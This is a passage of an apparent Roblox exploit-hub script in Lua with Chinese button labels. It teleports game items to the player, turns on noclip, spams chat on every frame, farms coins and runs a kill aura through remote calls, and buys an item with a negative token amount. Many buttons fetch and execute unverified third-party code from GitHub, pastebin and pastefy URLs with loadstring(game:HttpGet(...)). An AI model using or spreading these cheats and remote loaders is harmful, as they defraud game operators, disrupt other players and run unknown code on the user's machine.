                if itemName:find(keyword:lower()) then
                    isBurger = true
                    break
                end
            end
            
            -- 如果是汉堡且可移动
            if isBurger and not item.Anchored and not item:IsDescendantOf(Character) then
                -- 传送到玩家附近
                local randomOffset = Vector3.new(
                    math.random(-2, 2),
                    math.random(1, 2),
                    math.random(-2, 2)
                )
                item.CFrame = RootPart.CFrame + randomOffset
                burgerCount = burgerCount + 1
                print("✅ 传送汉堡: " .. item.Name)
            end
        end
    end
    
    return burgerCount
end

-- 执行传送
local totalBurgers = teleportBurgersOnly()

-- 显示结果
if totalBurgers > 0 then
    print("🎉 成功传送 " .. totalBurgers .. " 个汉堡到您身边！")
    print("🍔 所有汉堡已传送到您的脚下")
else
    print("❌ 未找到任何汉堡")
    print("💡 可能原因：")
    print("  • 地图中没有汉堡")
    print("  • 汉堡已被其他玩家收集")
    print("  • 汉堡名称不匹配")
end

print("✅ 汉堡传送完成！")
    end)
end)

Button(Tab74, "收集热狗", function()
    pcall(function()
        
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

print("🌭 开始收集热狗...")

-- 热狗关键词列表
local hotdogKeywords = {
    "hotdog", "hot dog", "hot-dog", "frankfurter", "frank", "wiener", 
    "sausage", "bratwurst", "热狗", "热狗肠", "香肠", "法兰克福肠",
    "hotdog stand", "hotdog cart", "热狗摊", "热狗车",
    "food", "snack", "fastfood", "快餐", "小吃", "食物"
}

-- 收集热狗函数
local function collectHotdogs()
    local hotdogCount = 0
    local foundHotdogTypes = {}
    
    print("🔍 扫描游戏中的热狗...")
    
    -- 搜索整个workspace
    for _, item in pairs(Workspace:GetDescendants()) do
        if item:IsA("Part") or item:IsA("MeshPart") or item:IsA("UnionOperation") then
            local itemName = tostring(item.Name):lower()
            
            -- 检查是否是热狗
            local isHotdog = false
            local hotdogType = "未知热狗"
            
            for _, keyword in pairs(hotdogKeywords) do
                if itemName:find(keyword:lower()) then
                    isHotdog = true
                    hotdogType = keyword
                    break
                end
            end
            
            -- 如果是热狗且可移动
            if isHotdog and not item.Anchored and not item:IsDescendantOf(Character) then
                -- 传送到玩家附近
                local randomOffset = Vector3.new(
                    math.random(-2, 2),
                    math.random(1, 2),
                    math.random(-2, 2)
                )
                item.CFrame = RootPart.CFrame + randomOffset
                hotdogCount = hotdogCount + 1
                
                -- 统计热狗类型
                if not foundHotdogTypes[hotdogType] then
                    foundHotdogTypes[hotdogType] = 0
                end
                foundHotdogTypes[hotdogType] = foundHotdogTypes[hotdogType] + 1
                
                print("🌭 收集热狗: " .. item.Name)
            end
        end
    end
    
    return hotdogCount, foundHotdogTypes
end

-- 执行收集
local totalHotdogs, hotdogTypes = collectHotdogs()

-- 显示结果
if totalHotdogs > 0 then
    print("🎯 成功收集 " .. totalHotdogs .. " 个热狗！")
    print("🌭 收集的热狗详情：")
    
    for hotdogType, count in pairs(hotdogTypes) do
        print("  • " .. hotdogType .. ": " .. count .. "个")
    end
    
    print("📍 所有热狗已收集到您的角色位置")
    print("🍽️ 享受您的热狗大餐！")
else
    print("❌ 未找到任何热狗")
    print("💡 可能原因：")
    print("  • 地图中没有热狗")
    print("  • 热狗已被其他玩家收集")
    print("  • 热狗名称不匹配")
end

print("✅ 热狗收集完成！")
    end)
end)

Button(Tab74, "传送医疗包", function()
    pcall(function()
    
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

print("💊 开始精准收集医疗包...")

-- 医疗包关键词列表
local medkitKeywords = {
    "medkit", "firstaid", "first aid", "healthkit", "health kit", "medical kit",
    "医疗包", "急救包", "医疗箱", "急救箱", "医药包", "医药箱",
    "aid", "medical", "health", "heal", "treatment", "急救", "医疗", "治疗", "健康",
    "bandage", "gauze", "绷带", "纱布", "包扎",
    "medicine", "medication", "drug", "pill", "tablet", "capsule",
    "药品", "药物", "药丸", "药片", "胶囊",
    "antiseptic", "disinfectant", "消毒", "杀菌",
    "injection", "syringe", "needle", "注射", "针剂", "针筒"
}

-- 排除关键词（防止误收集）
local excludeKeywords = {
    "hospital", "clinic", "doctor", "nurse", "patient", "bed", "stretcher",
    "医院", "诊所", "医生", "护士", "病人", "病床", "担架",
    "ambulance", "emergency", "救护车", "急诊",
    "sign", "door", "wall", "floor", "ceiling", "desk", "chair",
    "标志", "门", "墙", "地板", "天花板", "桌子", "椅子"
}

-- 精准收集医疗包函数
local function collectMedkitsOnly()
    local medkitCount = 0
    local foundMedkitTypes = {}
    
    print("🔍 精准扫描医疗包...")
    
    -- 搜索整个workspace
    for _, item in pairs(Workspace:GetDescendants()) do
        if item:IsA("Part") or item:IsA("MeshPart") or item:IsA("UnionOperation") then
            local itemName = tostring(item.Name):lower()
            
            -- 检查是否应该排除（不是可收集的医疗包）
            local shouldExclude = false
            for _, excludeWord in pairs(excludeKeywords) do
                if itemName:find(excludeWord:lower()) then
                    shouldExclude = true
                    break
                end
            end
            
            if not shouldExclude then
                -- 检查是否是医疗包
                local isMedkit = false
                local medkitType = "未知医疗物品"
                
                for _, keyword in pairs(medkitKeywords) do
                    if itemName:find(keyword:lower()) then
                        isMedkit = true
                        medkitType = keyword
                        break
                    end
                end
                
                -- 如果是医疗包且可移动
                if isMedkit and not item.Anchored and not item:IsDescendantOf(Character) then
                    -- 传送到玩家附近
                    local randomOffset = Vector3.new(
                        math.random(-2, 2),
                        math.random(1, 2),
                        math.random(-2, 2)
                    )
                    item.CFrame = RootPart.CFrame + randomOffset
                    medkitCount = medkitCount + 1
                    
                    -- 统计医疗包类型
                    if not foundMedkitTypes[medkitType] then
                        foundMedkitTypes[medkitType] = 0
                    end
                    foundMedkitTypes[medkitType] = foundMedkitTypes[medkitType] + 1
                    
                    print("💊 收集医疗包: " .. item.Name)
                end
            end
        end
    end
    
    return medkitCount, foundMedkitTypes
end

-- 执行收集
local totalMedkits, medkitTypes = collectMedkitsOnly()

-- 显示结果
if totalMedkits > 0 then
    print("🎯 成功收集 " .. totalMedkits .. " 个医疗包！")
    print("💊 收集的医疗包详情：")
    
    for medkitType, count in pairs(medkitTypes) do
        print("  • " .. medkitType .. ": " .. count .. "个")
    end
    
    print("📍 所有医疗包已收集到您的角色位置")
    print("❤️ 您的生命值有保障了！")
else
    print("❌ 未找到任何医疗包")
    print("💡 可能原因：")
    print("  • 地图中没有医疗包")
    print("  • 医疗包已被其他玩家收集")
    print("  • 医疗包名称不匹配")
end

print("✅ 医疗包收集完成！")
    end)
end)

Button(Tab74, "收集手电筒", function()
    pcall(function()
        local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

print("🔦 开始精准收集手电筒...")

-- 手电筒关键词列表
local flashlightKeywords = {
    "flashlight", "torch", "light", "lamp", "lantern", "beam", "spotlight",
    "手电筒", "手电", "电筒", "照明", "灯具", "探照灯", "聚光灯",
    "headlamp", "headlight", "头灯", "矿灯", "工作灯",
    "emergency light", "应急灯", "求生灯", "信号灯",
    "portable light", "handheld light", "便携灯", "手持灯"
}

-- 排除关键词（防止误收集其他照明设备）
local excludeKeywords = {
    "ceiling", "wall", "floor", "table", "desk", "bedside", "street", "road",
    "天花板", "墙壁", "地板", "桌子", "床头", "街道", "道路",
    "lamp post", "street light", "traffic light", "路灯", "街灯", "交通灯",
    "bulb", "tube", "fluorescent", "led", "灯泡", "灯管", "荧光灯", "LED灯",
    "chandelier", "pendant", "sconce", "吊灯", "挂灯", "壁灯",
    "sun", "moon", "star", "sky", "太阳", "月亮", "星星", "天空"
}

-- 精准收集手电筒函数
local function collectFlashlightsOnly()
    local flashlightCount = 0
    local foundFlashlightTypes = {}
    
    print("🔍 精准扫描手电筒...")
    
    -- 搜索整个workspace
    for _, item in pairs(Workspace:GetDescendants()) do
        if item:IsA("Part") or item:IsA("MeshPart") or item:IsA("UnionOperation") then
            local itemName = tostring(item.Name):lower()
            
            -- 检查是否应该排除（不是可收集的手电筒）
            local shouldExclude = false
            for _, excludeWord in pairs(excludeKeywords) do
                if itemName:find(excludeWord:lower()) then
                    shouldExclude = true
                    break
                end
            end
            
            if not shouldExclude then
                -- 检查是否是手电筒
                local isFlashlight = false
                local flashlightType = "未知照明设备"
                
                for _, keyword in pairs(flashlightKeywords) do
                    if itemName:find(keyword:lower()) then
                        isFlashlight = true
                        flashlightType = keyword
                        break
                    end
                end
                
                -- 如果是手电筒且可移动
                if isFlashlight and not item.Anchored and not item:IsDescendantOf(Character) then
                    -- 传送到玩家附近
                    local randomOffset = Vector3.new(
                        math.random(-2, 2),
                        math.random(1, 2),
                        math.random(-2, 2)
                    )
                    item.CFrame = RootPart.CFrame + randomOffset
                    flashlightCount = flashlightCount + 1
                    
                    -- 统计手电筒类型
                    if not foundFlashlightTypes[flashlightType] then
                        foundFlashlightTypes[flashlightType] = 0
                    end
                    foundFlashlightTypes[flashlightType] = foundFlashlightTypes[flashlightType] + 1
                    
                    print("🔦 收集手电筒: " .. item.Name)
                end
            end
        end
    end
    
    return flashlightCount, foundFlashlightTypes
end

-- 执行收集
local totalFlashlights, flashlightTypes = collectFlashlightsOnly()

-- 显示结果
if totalFlashlights > 0 then
    print("🎯 成功收集 " .. totalFlashlights .. " 个手电筒！")
    print("🔦 收集的手电筒详情：")
    
    for flashlightType, count in pairs(flashlightTypes) do
        print("  • " .. flashlightType .. ": " .. count .. "个")
    end
    
    print("📍 所有手电筒已收集到您的角色位置")
    print("💡 您的夜间照明有保障了！")
else
    print("❌ 未找到任何手电筒")
    print("💡 可能原因：")
    print("  • 地图中没有手电筒")
    print("  • 手电筒已被其他玩家收集")
    print("  • 手电筒名称不匹配")
end

print("✅ 手电筒收集完成！")
    end)
end)

Button(Tab74, "收集红色方块", function()
    pcall(function()
        local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

print("🟥 开始精准收集红色正方形方块...")

-- 红色正方形方块收集函数
local function collectRedSquareBlocks()
    local redSquareCount = 0
    local foundRedSquareTypes = {}
    
    print("🔍 精准扫描红色正方形方块...")
    
    -- 搜索整个workspace
    for _, item in pairs(Workspace:GetDescendants()) do
        if item:IsA("Part") and not item.Anchored and not item:IsDescendantOf(Character) then
            -- 检查是否为正方形（长宽高大致相等）
            local size = item.Size
            local isSquare = math.abs(size.X - size.Y) < 0.5 and 
                            math.abs(size.Y - size.Z) < 0.5 and
                            math.abs(size.Z - size.X) < 0.5
            
            -- 检查颜色是否为红色
            local isRed = false
            local color = item.BrickColor
            local r, g, b = color.r, color.g, color.b
            
            -- 判断是否为红色（R值高，G和B值低）
            if r > 0.4 and g < 0.4 and b < 0.4 then
                isRed = true
            end
            
            -- 如果是红色正方形方块
            if isSquare and isRed then
                -- 传送到玩家附近
                local randomOffset = Vector3.new(
                    math.random(-2, 2),
                    math.random(1, 2),
                    math.random(-2, 2)
                )
                item.CFrame = RootPart.CFrame + randomOffset
                redSquareCount = redSquareCount + 1
                
                -- 判断正方形大小类型
                local squareType = "小正方形"
                local avgSize = (size.X + size.Y + size.Z) / 3
                if avgSize > 3 then
                    squareType = "大正方形"
                elseif avgSize > 1.5 then
                    squareType = "中正方形"
                end
                
                -- 统计红色正方形类型
                if not foundRedSquareTypes[squareType] then
                    foundRedSquareTypes[squareType] = 0
                end
                foundRedSquareTypes[squareType] = foundRedSquareTypes[squareType] + 1
                
                print("🟥 收集红色正方形方块: " .. item.Name .. " (大小: " .. string.format("%.1f", avgSize) .. ")")
            end
        end
    end
    
    return redSquareCount, foundRedSquareTypes
end

-- 执行收集
local totalRedSquares, redSquareTypes = collectRedSquareBlocks()

-- 显示结果
if totalRedSquares > 0 then
    print("🎯 成功收集 " .. totalRedSquares .. " 个红色正方形方块！")
    print("🟥 收集的红色正方形方块详情：")
    
    for squareType, count in pairs(redSquareTypes) do
        print("  • " .. squareType .. ": " .. count .. "个")
    end
    
    print("📍 所有红色正方形方块已收集到您的角色位置")
    print("📐 正方形方块收集完成！")
else
    print("❌ 未找到任何红色正方形方块")
    print("💡 可能原因：")
    print("  • 地图中没有红色正方形方块")
    print("  • 红色正方形方块已被其他玩家收集")
    print("  • 方块不是正方形或不是红色")
end

print("✅ 红色正方形方块收集完成！")
    end)
end)

Button(Tab74, "飞行", function() 
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/jm%E9%A3%9E..lua"))()
    end)
end)

Toggle(Tab74, "穿墙", false, function(a)
    pcall(function()
        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("BasePart") then
                v.CanCollide = not a
            end
        end
    end)
end)

Toggle(Tab74, "夜视", false, function(a)
    pcall(function()
        if a then
            game.Lighting.Ambient = Color3.new(1, 1, 1)
        else
            game.Lighting.Ambient = Color3.new(0, 0, 0)
        end
    end)
end)

-- 失落的前线 (Tab75)
Button(Tab75, "失落的前线1（要卡密）", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]

-- https://discord.gg/JFpzR7Cv for key

loadstring(game:HttpGet("https://raw.githubusercontent.com/larsscriptz/Scripts/refs/heads/main/TheLostFront",true))()
    end)
end)

-- 建造一个奥比 (Tab76)
Button(Tab76, "英文", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastebin.com/raw/26YmD16d"))() 


print("https://direct-link.net/1449506/KSYcTkiTENw3") 

--Enjoy the script! 
    end)
end)

-- 聊天室💬 [阿拉伯语] (Tab77)
Button(Tab77, "聊天刷屏\n\n聊天里刷屏，但其实不好。因为聊天里有小丑", function()
    -- 核心服务预加载+错误捕获初始化
    local success, err = pcall(function()
        local ga = game
        local rs = ga:GetService("ReplicatedStorage")
        local pl = ga:GetService("Players").LocalPlayer
        local ca = pl:WaitForChild("PlayerGui", 10) -- 10秒超时保护
        local runService = ga:GetService("RunService")
        local userInputService = ga:GetService("UserInputService")

        -- 防重复创建：删除已存在的UI
        if ca:FindFirstChild("GG") then
            ca.GG:Destroy()
        end

        -- UI创建函数（优化层级结构+视觉反馈）
        local function createUI()
            local sc = Instance.new("ScreenGui")
            sc.Name = "GG"
            sc.Parent = ca
            sc.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            sc.IgnoreGuiInset = false -- 适配屏幕边界

            -- 主开关按钮
            local tg = Instance.new("TextButton")
            tg.Name = "TG"
            tg.Text = "Chat Spam"
            tg.Size = UDim2.new(0.18, 0, 0.05, 0)
            tg.Position = UDim2.new(0.01, 0, 0.01, 0)
            tg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            tg.BackgroundTransparency = 0.1
            tg.BorderSizePixel = 0
            tg.TextColor3 = Color3.new(1, 1, 1)
            tg.Font = Enum.Font.SourceSansBold
            tg.TextSize = 20
            tg.AutoButtonColor = true -- 点击视觉反馈
            tg.Parent = sc

            -- 按钮美化组件
            local ug1 = Instance.new("UICorner")
            ug1.CornerRadius = UDim.new(0, 8)
            ug1.Parent = tg

            local ui1 = Instance.new("UIGradient")
            ui1.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 180, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 255))
            })
            ui1.Parent = tg

            -- 输入面板
            local fr = Instance.new("Frame")
            fr.Name = "FR"
            fr.Size = UDim2.new(0.35, 0, 0.1, 0)
            fr.Position = UDim2.new(0.325, 0, 0.85, 0)
            fr.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            fr.BackgroundTransparency = 0.2
            fr.BorderSizePixel = 0
            fr.ClipsDescendants = true
            fr.Parent = sc
            fr.Visible = false -- 默认隐藏

            -- 面板美化组件
            local ug = Instance.new("UICorner")
            ug.CornerRadius = UDim.new(0, 10)
            ug.Parent = fr

            local ui = Instance.new("UIGradient")
            ui.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 255))
            })
            ui.Parent = fr

            -- 输入文本框
            local ti = Instance.new("TextBox")
            ti.Name = "TT"
            ti.PlaceholderText = "Type message here... (Multi-line enabled)"
            ti.Text = "Hello!"
            ti.Size = UDim2.new(0.7, 0, 1, 0)
            ti.Position = UDim2.new(0, 0, 0, 0)
            ti.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            ti.BackgroundTransparency = 0.1
            ti.BorderSizePixel = 0
            ti.TextColor3 = Color3.new(1, 1, 1)
            ti.TextSize = 16
            ti.Font = Enum.Font.SourceSans
            ti.MultiLine = true
            ti.ClearTextOnFocus = false -- 聚焦不清除文本
            ti.Parent = fr

            -- 发送按钮
            local se = Instance.new("TextButton")
            se.Name = "SS"
            se.Text = "Send"
            se.Size = UDim2.new(0.15, 0, 1, 0)
            se.Position = UDim2.new(0.7, 0, 0, 0)
            se.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
            se.BorderSizePixel = 0
            se.TextColor3 = Color3.new(1, 1, 1)
            se.Font = Enum.Font.SourceSansBold
            se.AutoButtonColor = true
            se.Parent = fr

            -- 刷屏按钮
            local sp = Instance.new("TextButton")
            sp.Name = "SM"
            sp.Text = "Spam"
            sp.Size = UDim2.new(0.15, 0, 1, 0)
            sp.Position = UDim2.new(0.85, 0, 0, 0)
            sp.BackgroundColor3 = Color3.fromRGB(255, 50, 100)
            sp.BorderSizePixel = 0
            sp.TextColor3 = Color3.new(1, 1, 1)
            sp.Font = Enum.Font.SourceSansBold
            sp.AutoButtonColor = true
            sp.Parent = fr

            return sc, tg, fr, ti, se, sp
        end

        -- 发送消息函数（增加错误捕获）
        local function sendMessage(text)
            if type(text) ~= "string" or text == "" then
                if _G.WindUI then
                    _G.WindUI:Notify({
                        Title = "输入错误",
                        Content = "消息不能为空！",
                        Icon = "error",
                        Duration = 2
                    })
                else
                    warn("输入错误：消息不能为空！")
                end
                return
            end

            local ev = rs:FindFirstChild("ChatMessageEvent")
            if ev then
                local fireSuccess = pcall(ev.FireServer, ev, text)
                if not fireSuccess then
                    if _G.WindUI then
                        _G.WindUI:Notify({
                            Title = "发送失败",
                            Content = "无法发送消息（服务器限制）",
                            Icon = "error",
                            Duration = 2
                        })
                    else
                        warn("发送失败：无法发送消息（服务器限制）")
                    end
                end
            else
                if _G.WindUI then
                    _G.WindUI:Notify({
                        Title = "功能缺失",
                        Content = "未找到聊天事件（不兼容当前游戏）",
                        Icon = "error",
                        Duration = 2
                    })
                else
                    warn("功能缺失：未找到聊天事件（不兼容当前游戏）")
                end
            end
        end

        -- 拖拽功能（优化边界检测）
        local function enableDragging(frame)
            local isDragging = false
            local startPosition = Vector2.new()
            local frameStartPosition = UDim2.new()

            frame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    isDragging = true
                    startPosition = userInputService:GetMouseLocation()
                    frameStartPosition = frame.Position
                end
            end)

            userInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    isDragging = false
                end
            end)

            userInputService.InputChanged:Connect(function(input)
                if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    local delta = userInputService:GetMouseLocation() - startPosition
                    local newPos = frameStartPosition + UDim2.new(0, delta.X, 0, delta.Y)
                    
                    -- 限制在屏幕内
                    newPos = UDim2.new(
                        math.clamp(newPos.X.Scale, 0, 1 - frame.Size.X.Scale),
                        newPos.X.Offset,
                        math.clamp(newPos.Y.Scale, 0, 1 - frame.Size.Y.Scale),
                        newPos.Y.Offset
                    )
                    
                    frame.Position = newPos
                end
            end)
        end

        -- 初始化UI和功能
        local sc, tg, fr, ti, se, sp = createUI()
        enableDragging(fr)

        -- 开关面板显示/隐藏
        tg.MouseButton1Click:Connect(function()
            fr.Visible = not fr.Visible
            if _G.WindUI then
                _G.WindUI:Notify({
                    Title = "面板控制",
                    Content = fr.Visible and "已显示刷屏面板" or "已隐藏刷屏面板",
                    Icon = "info",
                    Duration = 1.5
                })
            else
                warn(fr.Visible and "已显示刷屏面板" or "已隐藏刷屏面板")
            end
        end)

        -- 单次发送
        se.MouseButton1Click:Connect(function()
            sendMessage(ti.Text)
        end)

        -- 刷屏控制（优化协程管理）
        local spamConnection = nil
        sp.MouseButton1Click:Connect(function()
            if spamConnection then
                -- 停止刷屏
                spamConnection:Disconnect()
                spamConnection = nil
                sp.Text = "Spam"
                sp.BackgroundColor3 = Color3.fromRGB(255, 50, 100)
                if _G.WindUI then
                    _G.WindUI:Notify({
                        Title = "刷屏停止",
                        Content = "已停止自动刷屏",
                        Icon = "check",
                        Duration = 1.5
                    })
                else
                    warn("已停止自动刷屏")
                end
            else
                -- 开始刷屏
                spamConnection = runService.Heartbeat:Connect(function()
                    sendMessage(ti.Text)
                    wait(0.1) -- 控制刷屏频率
                end)
                sp.Text = "Stop"
                sp.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                if _G.WindUI then
                    _G.WindUI:Notify({
                        Title = "刷屏开启",
                        Content = "已开始自动刷屏（谨慎使用）",
                        Icon = "warning",
                        Duration = 2
                    })
                else
                    warn("已开始自动刷屏（谨慎使用）")
                end
            end
        end)

        -- 初始通知
        if _G.WindUI then
            _G.WindUI:Notify({
                Title = "聊天刷屏",
                Content = "功能已加载完成，点击顶部按钮打开面板",
                Icon = "crown",
                Duration = 3
            })
        else
            warn("聊天刷屏功能已加载完成，点击顶部按钮打开面板")
        end
    end)

    -- 全局错误处理
    if not success then
        if _G.WindUI then
            _G.WindUI:Notify({
                Title = "加载失败",
                Content = "刷屏功能初始化错误：" .. tostring(err),
                Icon = "error",
                Duration = 3
            })
        else
            warn("刷屏功能初始化错误：" .. tostring(err))
        end
    end
end)

-- [✨2倍经验✨]植物进化 (Tab78)
Button(Tab78, "oP脚本", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/PlantEvolution"))()
    end)
end)

-- 🦘跳跃去见辫inrots！ (Tab79)
Button(Tab79, "刷钱", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--t.me/Soul_Scr1pt
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local sequence = workspace.WinSequences["Odin Din Din Dun"]
local touchPart = sequence.WinPad.TouchPart
local touchInterest = touchPart.TouchInterest
local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Functions"):WaitForChild("BuyUpgrade")
local args = {"Coins"}

local connection
local function startLoop()
    if connection then connection:Disconnect() end
    
    connection = RunService.Heartbeat:Connect(function()
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            local humanoid = player.Character.Humanoid
            if humanoid.Health > 0 then
                firetouchinterest(player.Character.HumanoidRootPart, touchPart, 0)
                firetouchinterest(player.Character.HumanoidRootPart, touchPart, 1)
                remote:InvokeServer(unpack(args))
            end
        end
    end)
end

player.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid")
    character.Humanoid.Died:Connect(function()
        task.wait(1)
        startLoop()
    end)
    startLoop()
end)

if player.Character then startLoop() end
    end)
end)

-- 钓鱼！ 🐟 (Tab80)
Button(Tab80, "最好的脚本钓法", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastebin.com/raw/iyYc5zds"))()
    end)
end)

Button(Tab80, "最好的脚本钓法2", function()
    pcall(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/de-ishi/scripts/refs/heads/main/Aze_Loader'))()
-- enjoy twin 
    end)
end)

-- [史莱姆]键盘ASMR塔 (Tab81)
Button(Tab81, "自动步行登顶", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastefy.app/eAr7aXfU/raw"))()
    end)
end)

-- [🎣鱼+🐶宠物]安吉尔山🥴 (Tab82)
Button(Tab82, "脚本1", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.gatinero.xyz/main.lua"))()
    end)
end)

-- 🍰 烘焙或死亡 💀 (Tab83)
Button(Tab83, "杀死光环", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local ZAP = require(game:GetService("ReplicatedStorage").Client.ClientRemotes)
local slotNumber = 2 -- your melee slot
local auraDistance = 25 -- kill aura distnace

while true do
    task.wait()
    
    local character = game.Players.LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local root = character.HumanoidRootPart
        
        for _, monster in pairs(workspace.Monsters:GetChildren()) do
            if monster:FindFirstChild("HumanoidRootPart") then
                local distance = (root.Position - monster.HumanoidRootPart.Position).Magnitude
                if distance < auraDistance then
                    ZAP.meleeAttack.fire({
                        monsters = {monster},
                        civilians = {},
                        activeSlot = slotNumber
                    })
                    break
                end
            end
        end
    end
end
    end)
end)

-- 打破朋友 🦴 (Tab84)
Button(Tab84, "现金组 I 自动升级", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/Defy-cloud/Scripts/refs/heads/main/BreakaFriend",true))()
    end)
end)

-- 【⚔️公会战争】[第38卷]修炼：凡人至仙人 (Tab85)
Button(Tab85, "自动一切及更多", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Tseting-nil/-Cultivation-Simulator-script/refs/heads/main/%E5%95%9F%E5%8B%95%E5%99%A8%E5%8A%A0%E5%AF%86%E9%81%B8%E5%96%AE.lua'))()
    end)
end)

-- 杀人犯对警长决斗 (Tab86)
Button(Tab86, "最佳脚本", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://gist.githubusercontent.com/ekuve/2b8487682ec7220be76b9342d3357425/raw"))()
    end)
end)

-- 🥊拳击怪兽！ 🥊 (Tab87)
Button(Tab87, "步兵力量与步兵胜利", function()
    pcall(function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/EnesKam21/punchmonsters/refs/heads/main/punchmonsters.lua"))()
    end)
end)

-- 隐形藏匿 (Tab88)
Button(Tab88, "隐形藏匿1", function()
    pcall(function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/EnesKam21/seekershiders/refs/heads/main/seekershiders.lua"))() 
    end)
end)

-- [第一人称射击]电影上传者 (Tab89)
Button(Tab89, "最佳FLK脚本", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastefy.app/uHTG5W3f/raw"))()
    end)
end)

-- 成为杀手级重码 (Tab90)
Button(Tab90, "功能  获得启动资金10万", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local args = {
	"Fuwatti", --change killer if you already have it
	"Tokens",
	-111300 
}
game:GetService("ReplicatedStorage"):WaitForChild("KillerMenuStuff"):WaitForChild("KillerPurchase"):InvokeServer(unpack(args))
    end)
end)

-- [✨] NPC或者死！ 💢 (Tab91)
Button(Tab91, "没有钥匙", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Hjgyhfyh/Scripts-roblox/refs/heads/main/NPC_OR_DIE'))()
    end)
end)

-- 免费UGC✨奥比 (Tab92)
Button(Tab92, "自动完成", function()
    pcall(function()
        -- 校验核心服务与玩家状态，避免空值错误
        local LocalPlayer = game.Players.LocalPlayer
        if not LocalPlayer or not LocalPlayer.Character then
            WindUI:Notify({
                Title = "加载失败",
                Content = "角色未加载完成",
                Icon = "error",
                Duration = 3
            })
            return
        end
        -- 加载外部脚本，添加错误捕获反馈
        local scriptUrl = "https://raw.githubusercontent.com/plutobearz/pluza.gg/main/obbyforfreeugc.lua"
        local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
        if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
            local execSuccess = pcall(loadstring(scriptContent))
            WindUI:Notify({
                Title = execSuccess and "加载成功" or "执行失败",
                Content = execSuccess and "自动完成功能已启动" or "脚本执行异常（兼容/语法问题）",
                Icon = execSuccess and "crown" or "error",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "加载失败",
                Content = "脚本链接失效/网络错误",
                Icon = "error",
                Duration = 3
            })
        end
    end)
end)

--  [1.0] 基础论文教育 RP (Tab93)
Button(Tab93, "FPE角色扮演脚本", function()
    pcall(function()
    --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastefy.app/eGWvP8qO/raw", true))()
    end)
end)

